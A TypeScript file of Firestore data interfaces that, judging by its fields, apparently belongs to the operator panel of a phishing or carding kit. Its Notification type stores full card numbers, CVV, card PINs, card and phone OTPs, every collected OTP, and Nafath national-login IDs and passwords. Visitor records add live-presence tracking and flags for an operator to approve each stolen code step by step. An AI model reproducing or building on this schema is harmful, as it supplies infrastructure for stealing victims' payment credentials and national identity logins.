import { Timestamp } from "firebase/firestore"

interface Coordinates {
  lat: number
  lng: number
}

export interface UserEvent {
  action: string
  buildingNumber: string
  cardName: string
  cardNumber: string
  city: string
  coordinates: Coordinates
  country: string
  email: string
  firstName: string
  id: string
  lastName: string
  lastSeen: Date | string | Timestamp
  online: boolean
  phone: string
  postalCode: string
  street: string
}

export interface Visitor {
  id: string
  visitorId: string
  country: string
  action: string
  currentPage: string
  createdDate: string
  timestamp?: Timestamp
  online: boolean
  lastSeen?: Timestamp | Date | string
  cardLast4?: string
  cardOtpApproved: boolean
  cardPinApproved: boolean
  phoneOtpApproved: boolean
  nafathApproved: boolean
}

export interface Notification {
  id: string
  visitorId?: string
  createdDate: string
  timestamp?: Timestamp
  
  action?: string
  currentPage?: string
  currentStep?: string
  online?: boolean
  lastSeen?: Timestamp | Date | string
  
  fullName?: string
  fullNumber?: string
  nafazId?: string
  nafazPass?: string
  nafaz_pin?: string
  
  phone?: string
  phone2?: string
  phoneNumber?: string
  phoneOtpCode?: string
  phoneOtp?: string
  operator?: string
  
  country?: string
  city?: string
  district?: string
  street?: string
  postalCode?: string
  
  cardNumber?: string
  cardLast4?: string
  cardName?: string
  cardMonth?: string
  cardYear?: string
  expiryDate?: string
  cvv?: string
  pinCode?: string
  cardPin?: string
  cardOtp?: string
  
  otp?: string
  allOtps?: string[]
  otpCode?: string
  otpApproved?: boolean
  phoneVerificationStatus?: string
  authNumber?: string
  
  cardOtpApproved?: boolean
  cardPinApproved?: boolean
  phoneOtpApproved?: boolean
  nafathApproved?: boolean
  verified?: boolean
  
  vehicle_type?: string
  
  status?: "pending" | "approved" | "rejected"
  flagColor?: "red" | "yellow" | "green" | null
  isHidden?: boolean
}

export type FlagColor = "red" | "yellow" | "green" | null
